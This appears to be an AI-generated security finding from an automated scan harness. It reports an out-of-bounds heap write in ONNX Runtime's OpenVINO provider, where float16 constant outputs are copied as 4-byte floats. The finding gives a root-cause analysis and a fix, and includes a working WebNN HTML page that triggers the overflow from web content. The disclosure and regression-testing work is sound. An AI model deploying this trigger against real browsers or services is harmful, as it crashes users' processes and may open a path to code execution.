# Security finding #592: The ov::element::f16 branch at line 190-192 dispatches to FillOutpu…

**Summary:** The ov::element::f16 branch at line 190-192 dispatches to FillOutpu…

**CWE IDs:** CWE-787: Out-of-bounds Write
**Severity / Impact:** Heap buffer overflow: N×2 bytes beyond the allocated output buffer are overwritten with attacker-controlled float values for every f16 constant output element. Depending on element count (arbitrary from the ONNX graph), this can corrupt adjacent heap metadata or live objects, leading to process crash (DoS) or potentially remote code execution in the browser GPU/utility process that hosts the ORT OpenVINO EP.
**Affected location:** `targets/onnxruntime/onnxruntime/core/providers/openvino/backend_utils.cc:190` — `FillOutputsWithConstantData / FillOutputHelper<float>()`
**Validated for repos:** chromiumWebnn, onnxruntime
**Trust boundary:** Untrusted ONNX graph supplied via WebNN web content → ORT OpenVINO EP constant-output path (BasicBackend::Infer at basic_backend.cc:336, 415)

## Description / Root cause
The ov::element::f16 branch at line 190-192 dispatches to FillOutputHelper<float> instead of a 16-bit type. GetOutputTensor (line 111) calls context.GetOutput(index, output_shape) which allocates the ORT output buffer sized by the ONNX-declared f16 type (N×2 bytes). FillOutputHelper<float> then calls const_node->cast_vector<float>() producing N full 4-byte floats, obtains a float* to the same N×2-byte buffer via GetTensorMutableData<float>() (line 207), and writes N×4 bytes into it via std::copy (line 208) — a 2× heap overflow proportional to the number of constant elements.

**Validator analysis:** CONFIRMED real defect. backend_utils.cc:172-197 switch: the f16 case (190-192) calls FillOutputHelper<float>. FillOutputHelper<T> (203-209) does const_node->cast_vector<T>() → for T=float this returns N float values (f16 upcast to 32-bit), then GetTensorMutableData<float>() reinterprets the ORT output buffer as float*. That buffer was allocated by context.GetOutput(index, output_shape) (line 111) sized by the ONNX-declared FLOAT16 element type = N×2 bytes. std::copy then writes N×4 bytes → CWE-787 out-of-bounds heap write of 2N bytes with attacker-controlled constant values. No mitigation: the templated GetTensorMutableData<float> does not validate the tensor element type, and ValidateSubgraph (basic_backend.cc:160-167) sets is_constant without any type check. Reachable via the constant-output path when a WebNN-supplied subgraph's float16 output is const-foldable (Infer at basic_backend.cc:336 or 415). vulnType (CWE-787) and impact (heap overflow → DoS/possible RCE in the hosting process) are accurate. The proposed fix is correct and sufficient: either add a dedicated f16 branch that memcpy's the raw 16-bit data (matching get_byte_size), or instantiate FillOutputHelper<uint16_t>/<ov::float16> so the element width matches the 2-byte allocation. The memcpy variant is the cleaner of the two (avoids any float→uint16 element reinterpretation). A defensive ORT_ENFORCE that out_tensor.GetTensorSizeInBytes()==const_node->get_byte_size() before copying would harden all branches. Note: the observable effect is a heap overflow / ASan abort (crash, non-deterministic), so no cleanly-assertable WPT behavior test is produced per profile guidance; an HTML trigger and a best-effort unit skeleton are provided.

## Exploit / Proof of Concept
An attacker-controlled web page uses the WebNN API to submit an ONNX subgraph whose output is declared as FLOAT16 and whose value is a constant node (ov::op::v0::Constant with element type f16). ValidateSubgraph (basic_backend.cc:160-168) marks the subgraph is_constant=true and returns true without any type check. On the first Infer() call (basic_backend.cc:328-336 or 410-415), GetOutputTensor allocates an ORT tensor of N×2 bytes, then FillOutputsWithConstantData dispatches to FillOutputHelper<float> which writes N×4 bytes into that buffer. A constant node with, e.g., 1024 f16 elements causes a 2048-byte overflow into the heap.

## Reproduction (html)
```
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>WebNN f16 constant-output heap overflow (WI-592)</title></head>
<body>
<pre id="log"></pre>
<script>
// Requires Chromium with --enable-features=WebMachineLearningNeuralNetwork
// and a build that routes the WebNN service backend to the ORT OpenVINO EP.
// Goal: build a graph whose FLOAT16 output depends ONLY on constants, so the
// OpenVINO EP const-folds it into a Constant node -> const_outputs_map ->
// is_constant=true (basic_backend.cc:160) -> FillOutputsWithConstantData ->
// f16 branch (backend_utils.cc:190) dispatches FillOutputHelper<float>, writing
// N*4 bytes into an N*2-byte FLOAT16 output buffer.
async function run(){
  const log = m => document.getElementById('log').textContent += m + "\n";
  try{
    const ctx = await navigator.ml.createContext({deviceType:'gpu'});
    const builder = new MLGraphBuilder(ctx);
    const N = 4096;                       // 4096 f16 elems -> ~8KB overflow
    const f16bits = new Uint16Array(N).fill(0x3C00); // 1.0 in IEEE half
    const c1 = builder.constant({dataType:'float16', shape:[N]}, f16bits);
    const c2 = builder.constant({dataType:'float16', shape:[N]}, f16bits);
    // Output derives only from constants => const-foldable in OpenVINO.
    const out = builder.add(c1, c2);
    const graph = await builder.build({'out': out});
    const outBuf = new Uint16Array(N);    // ORT allocates N*2 bytes for FLOAT16
    await ctx.compute(graph, {}, {'out': outBuf}); // -> Infer -> overflow
    log('compute returned; if built with ASan the process aborts here');
    log(outBuf.slice(0,8).join(','));
  }catch(e){ log('error: '+e); }
}
run();
</script>
</body>
</html>
```

## Test (skeleton)
```cpp
// Agent-authored; NOT compiled or run against the source tree — review before use.
// Regression test for WI-592: backend_utils.cc:190-208.
// Pre-fix: the ov::element::f16 branch dispatches FillOutputHelper<float>, which
// cast_vector<float>()s N f16 constants into N 4-byte floats and std::copy's them
// into an N*2-byte FLOAT16 ORT output buffer -> ASan heap-buffer-overflow.
// Post-fix (f16 branch writes raw 16-bit data / uses <uint16_t>): the copy is
// bounded to N*2 bytes and the assertion below on output byte size holds.
//
// SKELETON: the in-tree ORT OpenVINO EP has no simple standalone gtest entry in
// this repo's provided harness table, and triggering the constant-output path
// needs a crafted ONNX subgraph whose FLOAT16 output const-folds to an
// ov::op::v0::Constant. Fill in the TODOs against the ORT EP test tree.
#include <gtest/gtest.h>
#include <cstdint>
#include <vector>
// TODO: include the ORT session/OpenVINO EP test fixtures used by
//       onnxruntime/test/providers/openvino/*.

TEST(OpenVINO_EP_ConstantOutput, F16ConstantOutputDoesNotOverflow) {
  // TODO: load/construct an ONNX model with:
  //   - a FLOAT16 graph output
  //   - value produced ONLY from FLOAT16 initializers (e.g. Add(constA,constB))
  //     so OpenVINO const-folds it into a Constant (populates const_outputs_map).
  // const char* model_path = "crafted_f16_const_output.onnx"; // TODO fixture
  // Ort::SessionOptions so; so.AppendExecutionProvider_OpenVINO_V2({{"device_type","CPU"}});
  // Ort::Session session(env, model_path, so);
  //
  // Run inference; a correct fix writes exactly N*sizeof(uint16_t) bytes.
  // ASSERT_NO_FATAL_FAILURE(session.Run(...));  // pre-fix: ASan abort here
  //
  // Optionally verify the produced output element type/size:
  // auto info = out.GetTensorTypeAndShapeInfo();
  // EXPECT_EQ(info.GetElementType(), ONNX_TENSOR_ELEMENT_DATA_TYPE_FLOAT16);
  // EXPECT_EQ(out.GetTensorSizeInBytes(), N * 2u);
  GTEST_SKIP() << "Provide crafted f16-constant-output .onnx fixture (see TODOs).";
}
```
**Build / run:** Build the ORT OpenVINO EP tests with ASan (e.g. build.py --use_openvino CPU --enable_address_sanitizer --build_shared_lib --test), then run: onnxruntime_test_all --gtest_filter='OpenVINO_EP_ConstantOutput.*'. Pre-fix expected failure: AddressSanitizer: heap-buffer-overflow WRITE of size 4 in onnxruntime::openvino_ep::backend_utils::FillOutputHelper<float> (backend_utils.cc:208), writing past the N*2-byte FLOAT16 output allocation. Post-fix: test passes (copy bounded to N*2 bytes).

## Suggested fix
Add a dedicated f16 branch that writes the raw 16-bit representation rather than upcasting to float. Replace lines 190-192 with: `case ov::element::Type_t::f16: { auto const_node = std::dynamic_pointer_cast<ov::op::v0::Constant>(node); auto* raw = out_tensor.GetTensorMutableRawData(); std::memcpy(raw, const_node->get_data_ptr(), const_node->get_byte_size()); break; }`. Alternatively, introduce `FillOutputHelper<uint16_t>` that calls `cast_vector<ov::float16>()` (which returns 16-bit values) and writes them into `GetTensorMutableData<uint16_t>()`, correctly matching the 2-byte-per-element allocation.


---
_Filed by an automated security-scan harness; AI-generated — review before acting._ Finding #592.
